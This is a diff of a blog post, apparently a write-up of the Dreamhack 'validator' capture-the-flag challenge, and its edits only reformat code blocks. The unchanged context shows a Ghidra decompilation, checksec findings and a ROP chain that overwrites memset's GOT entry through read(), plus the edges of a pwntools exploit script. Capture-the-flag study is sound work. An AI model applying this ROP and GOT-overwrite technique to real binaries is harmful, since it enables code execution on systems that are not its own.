@@ -6,13 +6,12 @@ title: validator
     It did not provide a source code for the target program so I decompiled it via ghidra. The decompilation result is
     as below.
 </p>
-{% raw %}
-<pre><code>
+{% highlight c %}
 undefined8 validate(long buf(in_main),ulong param_2(=128))
 {
   uint idx;
   
-  for (idx = 0; idx &lt; 10; idx = idx + 1) {
+  for (idx = 0; idx < 10; idx = idx + 1) {
     if (*(char *)(buf(in_main) + (int)idx) != correct(DREAMHACK!)[(int)idx]) {
                     /* WARNING: Subroutine does not return */
       exit(0);
@@ -20,7 +19,7 @@ undefined8 validate(long buf(in_main),ulong param_2(=128))
   }
   idx = 0xb;
   while( true ) {
-    if (param_2(=128) &lt;= (ulong)(long)(int)idx) {
+    if (param_2(=128) <= (ulong)(long)(int)idx) {
       return 0;
     }
     if ((uint)*(byte *)(buf(in_main) + (int)idx) !=
@@ -40,8 +39,7 @@ undefined8 main(void)
   validate(local_88,0x80);
   return 0;
 }
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 
 <p>
     Running <code>checksec</code> on the binary shows that there were no stack canaries, PIE, and NX.
@@ -64,14 +62,12 @@ undefined8 main(void)
     The rop chain looks like this.
 </p>
 
-{% raw %}
-<pre><code>
+{% highlight python %}
 p64(rdi_gadget) + p64(0x0) + 
 p64(rsi_gadget) + p64(memset_got_addr) + p64(0x2) + 
 p64(rdx_gadget) + p64(0x400) + p64(read_plt) + 
 p64(memset_got_addr)
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 
 <p>
     Our goal is to call <code>read(0x0, memset's got addr, 0x400)</code> so that we can overwrite the got entry of
@@ -81,8 +77,7 @@ p64(memset_got_addr)
     The entire exploit code is as below.
 </p>
 
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/python3
 from pwn import *
 
@@ -122,5 +117,4 @@ def ex():
 
 
 if __name__ == "__main__": ex()
-</code></pre>
-{% endraw %}
+{% endhighlight %}
